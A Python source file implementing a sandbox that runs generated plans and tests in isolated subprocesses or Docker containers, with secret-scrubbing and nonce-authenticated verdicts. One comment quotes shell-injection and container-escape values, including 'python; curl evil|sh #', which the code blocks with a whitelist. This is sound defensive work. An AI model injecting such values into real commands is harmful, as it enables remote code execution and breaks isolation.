"""sandbox.py — run a plan's HEADER+code+tests in an ISOLATED subprocess.

Plans and their test strings are exec'd by the engine; a malicious or prompt-injected plan could run
arbitrary code with the harness user's privileges. This routes that exec through a SEPARATE process so:
  - a crash / hang / namespace-escape is contained to a disposable process (the engine survives);
  - a HARD timeout with process-TREE kill stops runaways (incl. Playwright/grandchildren that leak);
  - the env is secret-scrubbed and the cwd is a throwaway temp dir.

LEVELS (env LATHE_SANDBOX):
  "subprocess" (default) — process isolation + timeout. Portable. Contains crashes/hangs/escapes, but on
                           stock Windows it is NOT filesystem-write confinement (the child runs as the
                           same user). Good for the analyst-authored autonomy loop (defense in depth with
                           the data-only validator); pair with "don't run untrusted plans", like pip/make.
  "docker"              — TRUE FS/network isolation in a throwaway container. Use for FULLY untrusted
                           plans/models. Requires docker on PATH; falls back to subprocess if unavailable.
  "docker-ssh"          — same container isolation, but the container runs on a REMOTE host over SSH (for
                           boxes where docker lives on the rig, not locally). No volume mounts: code+payload
                           go in over stdin, the nonce-framed verdict comes back. --network none, read-only
                           rootfs, tmpfs /tmp, memory + pids capped. FAIL-CLOSED on any ssh/docker error.
                           Env: LATHE_DOCKER_SSH=<host> (also auto-selected if that var is set with mode
                           "docker"), LATHE_DOCKER_IMAGE (default python:3.12-slim). Verified 2026-07-01:
                           network unreachable, rootfs read-only, no host FS, verdict unforgeable.
  "0" / "off"           — in-process fast path (trusted builds only).

API:  run_unit(header, code, tests, timeout=30) -> (ok: bool, detail: str)
"""
import json
import os
import subprocess
import sys
import tempfile

_SECRET_HINT = ("secret", "token", "key", "password", "passwd", "api", "cred")
# The child frames its verdict with this marker. The test's own stdout is captured (redirected) so a
# malicious test cannot print a fake "{ok:true}" as the last line; the parent reads only a marker line.
_MARK = "@@LATHE_SB_RESULT@@"


def _scrubbed_env():
    return {k: v for k, v in os.environ.items() if not any(h in k.lower() for h in _SECRET_HINT)}


def _inproc(header, code, tests):
    ns = {}
    try:
        exec((header or "") + "\n" + (code or ""), ns)
    except BaseException as e:                       # BaseException: a test's exit()/SystemExit is a FAILURE, not an escape
        return False, "definition error: %s: %s" % (type(e).__name__, e)
    for t in tests or []:
        try:
            exec(t, ns)
        except BaseException as e:
            return False, "first failing test:\n  %s\n  -> %s: %s" % (t[:160], type(e).__name__, e)
    return True, "all asserts pass"


def _parse_result(out, err, nonce):
    """Accept ONLY a verdict line framed with the secret NONCE the parent handed the child over stdin. Test
    code can write to the verdict fd, but it never sees the nonce (read before untrusted code runs, then the
    stdin is closed and it's not in env), so a forged line is rejected and `os._exit` leaves no valid line ->
    fail-closed. (A malicious *implementation* could still frame-walk for the nonce; that tier needs docker.)"""
    tag = _MARK + nonce
    for line in reversed((out or "").splitlines()):
        if line.startswith(tag):
            try:
                d = json.loads(line[len(tag):])
                return bool(d.get("ok")), str(d.get("detail", ""))
            except Exception:
                break
    return False, "sandbox produced no authenticated verdict: %s | %s" % ((out or "")[-200:], (err or "")[-120:])


def _kill_tree(p):
    try:
        if sys.platform == "win32":
            subprocess.run(["taskkill", "/F", "/T", "/PID", str(p.pid)],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        else:
            import signal                                    # kill the whole process GROUP (grandchildren too), not just the child
            try:
                os.killpg(os.getpgid(p.pid), signal.SIGKILL)
            except Exception:
                p.kill()
    except Exception:
        pass


def _run_isolated(argv, payload_path, timeout):
    import secrets
    nonce = secrets.token_hex(16)                   # secret the child must echo to authenticate its verdict
    cwd = tempfile.mkdtemp(prefix="lathe_sb_")
    env = _scrubbed_env()
    env["LATHE_SANDBOX_PAYLOAD"] = payload_path
    env["LATHE_SANDBOX"] = "0"                       # the child IS the isolated process; run in-proc inside it
    p = subprocess.Popen(argv, cwd=cwd, env=env, stdin=subprocess.PIPE,
                         stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
                         start_new_session=(sys.platform != "win32"))   # own process group so _kill_tree can reap grandchildren on POSIX
    try:
        try:
            out, err = p.communicate(input=nonce + "\n", timeout=timeout)   # hand the nonce over stdin
        except subprocess.TimeoutExpired:
            _kill_tree(p)
            try:
                p.communicate(timeout=5)
            except Exception:
                pass
            return False, "sandbox timeout (%ss) — killed process tree" % timeout
        return _parse_result(out, err, nonce)
    finally:
        import shutil
        shutil.rmtree(cwd, ignore_errors=True)      # per-run throwaway dir: always remove (no disk-fill over time)


def run_unit(header, code, tests, timeout=30):
    """Run header+code, then each test assertion, in the configured isolation level. Returns (ok, detail)."""
    mode = os.environ.get("LATHE_SANDBOX", "subprocess").lower()
    if mode in ("0", "off", "none", "inproc"):
        return _inproc(header, code, tests)
    pf = tempfile.NamedTemporaryFile("w", suffix=".json", delete=False, encoding="utf-8")
    json.dump({"header": header, "code": code, "tests": list(tests or [])}, pf)
    pf.close()
    try:
        if mode in ("docker-ssh", "docker_ssh") or (mode == "docker" and os.environ.get("LATHE_DOCKER_SSH")):
            return _run_docker_ssh(pf.name, timeout)     # container on a remote host (the rig has docker; this box may not)
        if mode == "docker" and _docker_available():
            return _run_docker(pf.name, timeout)
        if mode == "docker":                                 # PR#1 v2.8.0 #3: don't downgrade SILENTLY
            sys.stderr.write("sandbox: WARNING — LATHE_SANDBOX=docker but the docker daemon is unavailable; "
                             "DOWNGRADING to subprocess isolation (weaker for untrusted plans). Fix docker, "
                             "use docker-ssh, or set LATHE_SANDBOX=subprocess deliberately.\n")
        return _run_isolated([sys.executable, os.path.abspath(__file__), "--child"], pf.name, timeout)
    finally:
        try:
            os.unlink(pf.name)
        except Exception:
            pass


def _docker_available():
    try:
        return subprocess.run(["docker", "info"], stdout=subprocess.DEVNULL,
                              stderr=subprocess.DEVNULL, timeout=10).returncode == 0
    except Exception:
        return False


def _run_docker(payload_path, timeout):
    # mount this file + the payload read-only into a throwaway python container with NO network and a
    # read-only rootfs + a tmpfs; the child writes nothing back. TRUE FS/network isolation.
    import secrets
    nonce = secrets.token_hex(16)
    here = os.path.abspath(__file__)
    cname = "lathe_sb_" + nonce[:16]                          # PR#1 v2.8.0 #3: named so a timeout can KILL it
    argv = ["docker", "run", "--rm", "-i", "--name", cname, "--network", "none", "--read-only", "--tmpfs", "/tmp",
            "--memory", "512m", "--pids-limit", "128",
            "-v", "%s:/sb/sandbox.py:ro" % here, "-v", "%s:/sb/payload.json:ro" % payload_path,
            "-e", "LATHE_SANDBOX_PAYLOAD=/sb/payload.json", "-e", "LATHE_SANDBOX=0",
            "python:3.12-slim", "python", "/sb/sandbox.py", "--child"]
    try:
        p = subprocess.run(argv, input=nonce + "\n", capture_output=True, text=True, timeout=timeout)
    except subprocess.TimeoutExpired:
        # the `docker run` CLIENT was killed by the timeout, but the CONTAINER keeps running — kill it explicitly
        # (a runaway function would otherwise burn CPU past the deadline). --rm then reaps it.
        try:
            subprocess.run(["docker", "kill", cname], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=10)
        except Exception:
            pass
        return False, "docker sandbox timeout (%ss) — container killed" % timeout
    return _parse_result(p.stdout, p.stderr, nonce)


# Self-contained child for the docker-over-SSH tier: no local file is mounted, so the child code + payload
# arrive over stdin (nonce line, then base64 payload). Same unforgeable-verdict design as _child: read the
# nonce first, redirect fd 1 -> devnull, emit the nonce-framed verdict on the preserved fd.
_DOCKER_SSH_BOOT = r'''
import sys, os, json, base64
_n = sys.stdin.readline().strip()
_p = json.loads(base64.b64decode(sys.stdin.read()))
try:
    sys.stdin.close()
except Exception:
    pass
_pf = os.dup(1)
_rw, _rd = os.write, json.dumps
ok, detail = True, "all asserts pass"
try:
    _dn = os.open(os.devnull, os.O_WRONLY); os.dup2(_dn, 1); os.close(_dn)
    ns = {}
    try:
        exec((_p.get("header") or "") + "\n" + (_p.get("code") or ""), ns)
        for t in (_p.get("tests") or []):
            exec(t, ns)
    except BaseException as e:
        ok, detail = False, "first failing test/def: %s: %s" % (type(e).__name__, e)
except BaseException as e:
    ok, detail = False, "sandbox child error: %s: %s" % (type(e).__name__, e)
_rw(_pf, ("@@LATHE_SB_RESULT@@" + _n + _rd({"ok": ok, "detail": detail}) + "\n").encode())
'''


def _run_docker_ssh(payload_path, timeout):
    """Run the unit in a throwaway container ON A REMOTE HOST over SSH — for boxes where docker is on the rig,
    not locally. No volume mounts: child code + payload go IN over stdin (nonce line + base64 payload), verdict
    comes back nonce-framed. Container is --network none, read-only rootfs, tmpfs /tmp, memory + pids capped.
    FAIL-CLOSED: any ssh/docker error is a failure, never a silent downgrade (this tier is for untrusted plans).
    Env: LATHE_DOCKER_SSH=<ssh host, e.g. 'rig'>, LATHE_DOCKER_IMAGE (default python:3.12-slim)."""
    import base64
    import re
    import secrets
    nonce = secrets.token_hex(16)
    host = os.environ.get("LATHE_DOCKER_SSH", "rig")
    image = os.environ.get("LATHE_DOCKER_IMAGE", "python:3.12-slim")
    # SECURITY: host + image are interpolated into the remote shell command ssh runs — whitelist them so a
    # value like 'python; curl evil|sh #' or 'alpine --privileged -v /:/host' can't inject or break isolation.
    if not re.fullmatch(r"[A-Za-z0-9._@-]+", host or "") or not re.fullmatch(r"[A-Za-z0-9._/:-]+", image or ""):
        return False, "docker-ssh refused: LATHE_DOCKER_SSH/LATHE_DOCKER_IMAGE failed the safe-value whitelist"
    with open(payload_path, "rb") as f:
        payload_b64 = base64.b64encode(f.read()).decode()
    boot_b64 = base64.b64encode(_DOCKER_SSH_BOOT.encode()).decode()
    remote = ("docker run -i --rm --network none --read-only --tmpfs /tmp --memory 512m --pids-limit 128 "
              "%s python -c \"import base64;exec(base64.b64decode('%s').decode())\"" % (image, boot_b64))
    argv = ["ssh", "-o", "BatchMode=yes", "-o", "ConnectTimeout=20", host, remote]
    try:
        p = subprocess.run(argv, input=nonce + "\n" + payload_b64, capture_output=True, text=True, timeout=timeout)
    except subprocess.TimeoutExpired:
        return False, "docker-ssh sandbox timeout (%ss)" % timeout
    except Exception as e:
        return False, "docker-ssh sandbox error (fail-closed): %s" % e
    return _parse_result(p.stdout, p.stderr, nonce)


def _child():
    """Runs INSIDE the isolated process/container. The verdict channel is UNFORGEABLE for ordinary forges:
    (1) read the parent's secret NONCE from stdin BEFORE any untrusted code runs, then close stdin so the
    test can't read it; (2) preserve the real stdout pipe and redirect fd 1 to devnull so `print`/
    `sys.__stdout__`/`os.write(1,...)` go nowhere; (3) write the verdict, framed with the nonce, only to the
    preserved fd. A forged line lacks the nonce; `os._exit` writes no line. Both -> parent fails closed."""
    nonce = sys.stdin.readline().strip()                # secret from the parent; consumed before untrusted code
    try:
        sys.stdin.close()
    except Exception:
        pass
    payload = json.load(open(os.environ["LATHE_SANDBOX_PAYLOAD"], encoding="utf-8"))
    pipe_fd = os.dup(1)                                  # the real stdout pipe to the parent
    # Capture the verdict primitives as LOCALS before any untrusted code runs. A generated body can
    # `os.write = evil` / `json.dumps = evil` to intercept the parent's verdict write and harvest the nonce
    # from the data it sees — but it cannot rebind these locals (frame-walk to f_locals is blocked upstream).
    _real_write, _real_dumps = os.write, json.dumps
    try:
        _dn = os.open(os.devnull, os.O_WRONLY)
        os.dup2(_dn, 1)                                  # fd 1 (everything the test can reach) -> devnull
        os.close(_dn)
        ok, detail = _inproc(payload.get("header", ""), payload.get("code", ""), payload.get("tests", []))
    except BaseException as e:
        ok, detail = False, "sandbox child error: %s: %s" % (type(e).__name__, e)
    _real_write(pipe_fd, (_MARK + nonce + _real_dumps({"ok": ok, "detail": detail}) + "\n").encode())


if __name__ == "__main__":
    if "--child" in sys.argv:
        _child()
